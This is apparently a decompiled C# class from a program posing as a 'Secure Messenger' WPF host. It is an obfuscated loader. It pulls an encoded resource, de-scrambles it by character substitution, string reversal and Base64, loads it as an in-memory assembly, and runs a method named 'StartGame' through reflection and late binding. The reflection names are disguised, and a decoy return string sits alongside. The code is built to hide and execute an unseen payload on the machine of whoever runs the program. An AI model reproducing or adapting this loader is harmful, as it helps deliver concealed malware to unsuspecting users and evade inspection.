using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;
using Secure.Messenger.WpfHost.Properties;

namespace Secure.Messenger.WpfHost;

internal class Secure1
{
	public Secure1(object[] io)
	{
		Rate(io);
	}

	public static string CorrectMarks(string s)
	{
		char[] array = Secure1.smethod_0(s);
		Secure1.smethod_1((Array)array);
		return Secure1.smethod_2(array);
	}

	public string Rate(object[] io)
	{
		byte[] array = Secure1.smethod_4(CorrectMarks(Secure1.smethod_3(Resources.Wpf, "*$#", "A")));
		Assembly assembly_ = (Assembly)Secure1.smethod_7(Secure1.smethod_6(Secure1.smethod_5("System()Reflection()Assembly", "()", ".")), OPk.oi, BindingFlags.InvokeMethod, (Binder)null, (object)null, new object[1] { array });
		MethodInfo object_ = Secure1.smethod_9(Secure1.smethod_8(assembly_, "AndroidStudio.AndroidClass"), "StartGame");
		char[] array2 = new char[4];
		Secure1.smethod_10((Array)array2, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		Secure1.smethod_12((object)object_, (Type)null, Secure1.smethod_11(Secure1.smethod_2(array2), "ke"), new object[2] { null, io }, (string[])null, (bool[])null);
		return "Globam warming";
	}

	static char[] smethod_0(string string_0)
	{
		return string_0.ToCharArray();
	}

	static void smethod_1(Array array_0)
	{
		Array.Reverse(array_0);
	}

	static string smethod_2(char[] char_0)
	{
		return new string(char_0);
	}

	static string smethod_3(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	static byte[] smethod_4(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	static string smethod_5(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	static Type smethod_6(string string_0)
	{
		return Type.GetType(string_0);
	}

	static object smethod_7(Type type_0, string string_0, BindingFlags bindingFlags_0, Binder binder_0, object object_0, object[] object_1)
	{
		return type_0.InvokeMember(string_0, bindingFlags_0, binder_0, object_0, object_1);
	}

	static Type smethod_8(Assembly assembly_0, string string_0)
	{
		return assembly_0.GetType(string_0);
	}

	static MethodInfo smethod_9(Type type_0, string string_0)
	{
		return type_0.GetMethod(string_0);
	}

	static void smethod_10(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray(array_0, runtimeFieldHandle_0);
	}

	static string smethod_11(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static object smethod_12(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, bool[] bool_0)
	{
		return LateBinding.LateGet(object_0, type_0, string_0, object_1, string_1, bool_0);
	}
}
